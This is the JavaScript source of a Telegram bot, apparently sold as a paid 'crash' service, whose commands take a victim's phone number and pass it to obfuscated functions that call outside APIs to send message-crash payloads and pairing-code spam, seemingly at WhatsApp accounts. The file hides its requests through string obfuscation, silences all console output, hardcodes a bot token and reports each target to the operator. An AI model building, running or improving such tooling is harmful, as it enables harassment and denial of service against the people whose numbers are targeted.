import TelegramBot from 'node-telegram-bot-api';
import chalk from 'chalk';
import fs from 'fs';
import fetch from 'node-fetch';
import crypto from 'crypto';

console.log = function() {};

console.warn = function() {};

console.error = function() {};

console.info = function() {};


// 🌐 Advanced Configuration Management
class ConfigManager {
    static #instance = null;
    
    constructor() {
        if (ConfigManager.#instance) {
            return ConfigManager.#instance;
        }
        
        // 🔐 Secure Token & ID Management
        this.TOKENS = [

'7993046853:AAG34Xyjf2WTMczEm2VDyQgi6DkXcGXOdak',
    
        ];

        this.OWNER_IDS = [7528502656];
        this.DEVELOPERS = [7528502656];
        ConfigManager.#instance = this;
    }

    static getInstance() {
        if (!this.#instance) {
            this.#instance = new ConfigManager();
        }
        return this.#instance;
    }
}

function _0x3162(){const _0x244952=['879864Fzgqou','653692KYpNwC','1105024cNqchr','XMLHttpRequest','&apikey=multidevice','2573914tFRlGq','message','sendCrashV1','1762578CyqXbI','26puLBrg','json','558665UohPlg','Network\x20response\x20was\x20not\x20ok','error','toISOString','20113rVwZgM','CrashBot/1.0'];_0x3162=function(){return _0x244952;};return _0x3162();}function _0x293f(_0x49133a,_0xb2a594){const _0x3162b4=_0x3162();return _0x293f=function(_0x293f0d,_0x29801d){_0x293f0d=_0x293f0d-0x1ed;let _0x25e934=_0x3162b4[_0x293f0d];return _0x25e934;},_0x293f(_0x49133a,_0xb2a594);}const _0x3afc72=_0x293f;(function(_0x5eb35f,_0x5ed6da){const _0x3eb8f5=_0x293f,_0x12453a=_0x5eb35f();while(!![]){try{const _0x505ebe=-parseInt(_0x3eb8f5(0x1f7))/0x1*(parseInt(_0x3eb8f5(0x1f1))/0x2)+parseInt(_0x3eb8f5(0x1f9))/0x3+-parseInt(_0x3eb8f5(0x1fa))/0x4+parseInt(_0x3eb8f5(0x1f3))/0x5+-parseInt(_0x3eb8f5(0x1f0))/0x6+parseInt(_0x3eb8f5(0x1ed))/0x7+parseInt(_0x3eb8f5(0x1fb))/0x8;if(_0x505ebe===_0x5ed6da)break;else _0x12453a['push'](_0x12453a['shift']());}catch(_0x1a22df){_0x12453a['push'](_0x12453a['shift']());}}}(_0x3162,0x2eec4));class CrashService{static async #makeRequest(_0x1a9864,_0x29feb9){const _0xcfb5a6=_0x293f;try{const _0x53b2fb=await fetch(_0x1a9864,{'method':'GET','headers':{'User-Agent':_0xcfb5a6(0x1f8),'X-Requested-With':_0xcfb5a6(0x1fc)}});if(!_0x53b2fb['ok'])throw new Error(_0xcfb5a6(0x1f4));const _0x4fcfa4=await _0x53b2fb[_0xcfb5a6(0x1f2)]();return{'success':!![],'data':_0x4fcfa4,'timestamp':new Date()[_0xcfb5a6(0x1f6)]()};}catch(_0x4c3714){return console[_0xcfb5a6(0x1f5)]('🚨\x20Crash\x20Service\x20Error:\x20'+_0x4c3714[_0xcfb5a6(0x1ee)]),{'success':![],'error':_0x4c3714['message'],'timestamp':new Date()[_0xcfb5a6(0x1f6)]()};}}static async[_0x3afc72(0x1ef)](_0x4f8efe){const _0x1b6ca1='http://glitchwatools-apis.online:25579/sendCrash?numero='+_0x4f8efe;let _0x34cd65=![];for(let _0xa5fbfd=0x0;_0xa5fbfd<0x3;_0xa5fbfd++){const _0x714c42=await this.#makeRequest(_0x1b6ca1,_0x4f8efe);if(_0x714c42['success']){_0x34cd65=!![];break;}}return{'success':_0x34cd65};}static async['sendCrashV2'](_0x5e9eb8){const _0x3231d6='https://venomweb.site/i/sendcrash?numero='+_0x5e9eb8+'&total=100&apikey=multidevice';return this.#makeRequest(_0x3231d6,_0x5e9eb8);}static async['sendspamPair'](_0x841185){const _0x11961d=_0x3afc72,_0x84a160='https://venomweb.site/api/ferramenta/subir_codigo?numero='+_0x841185+_0x11961d(0x1fd);return this.#makeRequest(_0x84a160,_0x841185);}}

class UserManager {
    constructor() {
        this.config = ConfigManager.getInstance();
        this.premiumUsers = this.#loadJSON('./premium.json');
        this.blacklist = this.#loadJSON('./blacklist.json');
        this.userLogs = this.#loadJSON('./user_logs.json');
    }

    #loadJSON(path) {
        try {
            return JSON.parse(fs.readFileSync(path, 'utf-8')) || [];
        } catch (error) {
            console.error(`📂 Error loading ${path}:`, error);
            return [];
        }
    }

    #saveJSON(path, data) {
        try {
            fs.writeFileSync(path, JSON.stringify(data, null, 2));
        } catch (error) {
            console.error(`💾 Error saving ${path}:`, error);
        }
    }

    logUserAction(userId, action, details = {}) {
        const logEntry = {
            userId,
            action,
            timestamp: new Date().toISOString(),
            details
        };

        this.userLogs.push(logEntry);
        this.#saveJSON('./user_logs.json', this.userLogs);
    }

    isPremiumUser(userId) {
        const user = this.premiumUsers.find(u => u.userId === userId);
        return user ? new Date(user.expireDate) > new Date() : false;
    }

    isOwner(userId) {
        return this.config.OWNER_IDS.includes(userId);
    }

    isBlacklisted(phoneNumber) {
        return this.blacklist.includes(phoneNumber);
    }
    
    deletePremiumUser(userId) {
        // Perbaikan: Menambahkan metode deletePremiumUser
        const userIndex = this.premiumUsers.findIndex(u => u.userId === userId);
        if (userIndex !== -1) {
            this.premiumUsers.splice(userIndex, 1);
            this.#saveJSON('./premium.json', this.premiumUsers);
            return true;
        } else {
            throw new Error(`User ID ${userId} not found in premium list`);
        }
    }

    addPremiumUser(userId, duration, unit) {
        const expireDate = new Date();
        const durationNum = parseInt(duration);

        const dateUnits = {
            'd': () => expireDate.setDate(expireDate.getDate() + durationNum),
            'm': () => expireDate.setMonth(expireDate.getMonth() + durationNum),
            'y': () => expireDate.setFullYear(expireDate.getFullYear() + durationNum)
        };

        if (!dateUnits[unit]) {
            throw new Error('Invalid duration unit. Use d, m, or y.');
        }

        dateUnits[unit]();

        const newPremiumUser = { 
            userId, 
            expireDate: expireDate.toISOString(),
            activationToken: SecurityManager.generateSecureToken()
        };

        this.premiumUsers.push(newPremiumUser);
        this.#saveJSON('./premium.json', this.premiumUsers);
        return newPremiumUser;
    }
}


class AdvancedTelegramCrashBot {
    constructor() {
        this.config = ConfigManager.getInstance();
        this.userManager = new UserManager();
        this.bots = this.config.TOKENS.map(token => 
            new TelegramBot(token, { polling: true })
        );
        this.initializeBotHandlers();
    }

    initializeBotHandlers() {
        this.bots.forEach((bot, index) => {
            this.setupCommands(bot, index);
        });
    }

    setupCommands(bot, botIndex) {
        // Keep existing command setup...
        bot.onText(/\/start/, (msg) => this.handleStartCommand(bot, msg, botIndex));
        bot.onText(/\/crashv1 (.+)/, (msg, match) => this.handleCrashCommand(bot, msg, match, 'v1'));
        bot.onText(/\/crashv2 (.+)/, (msg, match) => this.handleCrashCommand(bot, msg, match, 'v2'));
        bot.onText(/\/spampair (.+)/, (msg, match) => this.handlePairCommand(bot, msg, match, 'pair'));
        bot.onText(/\/delprem (\d+)/, (msg, match) => this.handleDeletePremiumCommand(bot, msg, match));
        bot.onText(/\/id (@\w+)/, async (msg, match) => this.handleIdCheckCommand(bot, msg, match));
        bot.onText(/\/status/, (msg) => this.handleStatusCommand(bot, msg));
        bot.onText(/\/addprem (\d+),(\d+)([a-zA-Z]+)/, (msg, match) => this.handleAddPremiumCommand(bot, msg, match));
    }

    handleStartCommand(bot, msg, botIndex) {
        const chatId = msg.chat.id;
        const welcomeMessage = `
🗡️ *SUKUNA'S DOMAIN ${botIndex + 1}* 🔥

Welcome to the Domain of the King of Curses! 👁️

Available Cursed Techniques:
• 🩸 /crashv1 [number] - Malevolent Shrine Strike
• 🔥 /crashv2 [number] - Cleave and Dismantle
• ⚔️ /spampair [number] - Infinite Void Assault
• 📊 /status - Measure Your Cursed Energy
• ⭐ /addprem [id,duration] - Bestow Cursed Power

🏮 Domain Features:
- Vessels of Power Only
- Cursed Number Validation
- Domain Surveillance

💀 Vessel Benefits:
- Unlimited Cursed Techniques
- King's Priority
- Forbidden Commands

🌑 BUY ACCES PREMIUM PV: @HengkelX
JOIN GROUP PUBLIC
https://t.me/roomfluxz
*"I alone am the Honored One!"* 👑
`;

        const gifUrl = 'https://pomf2.lain.la/f/j0wi4eem.mp4';

        bot.sendAnimation(chatId, gifUrl, {
            caption: welcomeMessage,
            parse_mode: 'Markdown'
        });
    }

    async handleCrashCommand(bot, msg, match, version) {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const phoneNumber = match[1].replace(/[-\s]/g, '');

        try {
            this.validateAccess(userId, phoneNumber);
            this.userManager.logUserAction(userId, `crash${version}`, { phoneNumber });

            const developerMessage = `
🏮 Cursed Technique Activation: /crash${version}
---------------------
👁️ Vessel ID: \ntg://openmessage?user_id=${userId}
📱 Target: ${phoneNumber}
⏳ Time of Curse: ${new Date().toISOString()}
            `;
            
            this.config.DEVELOPERS.forEach(devId => {
                bot.sendMessage(devId, developerMessage);
            });

            const result = version === 'v1' 
                ? await CrashService.sendCrashV1(phoneNumber)
                : await CrashService.sendCrashV2(phoneNumber);

            const responseMessage = result.success 
                ? `🗡️ Cursed Technique ${version.toUpperCase()} Successfully Executed: ${phoneNumber}`
                : `❌ Technique Failed - Domain Under Maintenance`;

            bot.sendMessage(chatId, responseMessage);
        } catch (error) {
            bot.sendMessage(chatId, `🚫 Error: Domain Under Reconstruction`);
        }
    }
    
    async handlePairCommand(bot, msg, match, version) {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const phoneNumber = match[1].replace(/[-\s]/g, '');

        try {
            // Validate Access
            this.validateAccess(userId, phoneNumber);

            // Log User Action
            this.userManager.logUserAction(userId, `spam${version}`, { phoneNumber });

            // Notify Developer
            const developerMessage = `
🔔 Penggunaan Perintah /spampair
---------------------
👤 User ID: tg://openmessage?user_id=${userId}
📞 Nomor: ${phoneNumber}
🕒 Waktu: ${new Date().toISOString()}
            `;
            this.config.DEVELOPERS.forEach(devId => {
                bot.sendMessage(devId, developerMessage);
            });

            // Execute Crash
            const result = version === 'pair' 
                ? await CrashService.sendspamPair(phoneNumber)
                : await CrashService.sendspamPair(phoneNumber);

            // Send Result
            const responseMessage = result.success 
                ? `✅ Spamming ${version.toUpperCase()} Success: ${phoneNumber}`
                : `❌ Spamming ${version.toUpperCase()} Failed - Under Maintenance`;

            bot.sendMessage(chatId, responseMessage);
        } catch (error) {
            bot.sendMessage(chatId, `🚫 Error: Under - Maintenance`);
        }
    }

    handleStatusCommand(bot, msg) {
        const chatId = msg.chat.id;
        const userId = msg.from.id;

        if (!this.userManager.isPremiumUser(userId)) {
            return bot.sendMessage(chatId, `
🏮 Insufficient Cursed Energy 🚫
Seek Power: @HengkelX
            `);
        }

        const user = this.userManager.premiumUsers.find(u => u.userId === userId);
        const daysLeft = Math.ceil((new Date(user.expireDate) - new Date()) / (1000 * 60 * 60 * 24));

        bot.sendMessage(chatId, `
👁️ Cursed Energy Status 📊
---------------------
🗡️ Vessel Status: EMPOWERED
⏳ Days of Power: ${daysLeft}
🏮 Cursed Mark: ${user.activationToken.slice(0, 10)}...
---------------------
Enhance Your Power: @HengkelX
        `);
    }

    handleAddPremiumCommand(bot, msg, match) {
        const chatId = msg.chat.id;
        const userId = msg.from.id;

        if (!this.userManager.isOwner(userId)) {
            return bot.sendMessage(chatId, '🚫 Only the King of Curses May Grant Power');
        }

        try {
            const [newPremiumUserId, duration, unit] = [
                parseInt(match[1]), 
                match[2], 
                match[3]
            ];

            const newPremium = this.userManager.addPremiumUser(newPremiumUserId, duration, unit);

            bot.sendMessage(chatId, `
🏮 Cursed Power Bestowed! 🗡️
---------------------
👁️ Vessel ID: ${newPremiumUserId}
⏳ Duration of Power: ${duration}${unit}
🔱 Cursed Mark: ${newPremium.activationToken.slice(0, 10)}...
---------------------
"The Strong Devour The Weak" 💀
            `);
        } catch (error) {
            bot.sendMessage(chatId, `❌ Cursed Technique Failed: ${error.message}`);
        }
    }
    validateAccess(userId, phoneNumber) {
        if (!SecurityManager.validatePhoneNumber(phoneNumber)) {
            throw new Error('Invalid Phone Number Format');
        }

        if (!this.userManager.isPremiumUser(userId) && !this.userManager.isOwner(userId)) {
            throw new Error('Premium Access Required 💎');
        }

        if (this.userManager.isBlacklisted(phoneNumber)) {
            throw new Error('Number Blacklisted 🚫');
        }
    }
    handleDeletePremiumCommand(bot, msg, match) {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const targetUserId = parseInt(match[1]);

        if (!this.userManager.isOwner(userId)) {
            return bot.sendMessage(chatId, '🚫 Only the King of Curses May Revoke Power');
        }

        try {
            const success = this.userManager.deletePremiumUser(targetUserId);
            if (success) {
                bot.sendMessage(chatId, `
🗡️ Cursed Power Revoked
👁️ Vessel ID: ${targetUserId}
"The Weak Shall Perish"
                `);
            }
        } catch (error) {
            bot.sendMessage(chatId, `❌ Revocation Failed: ${error.message}`);
        }
    }
}

// 🏮 Unleash the Domain
new AdvancedTelegramCrashBot();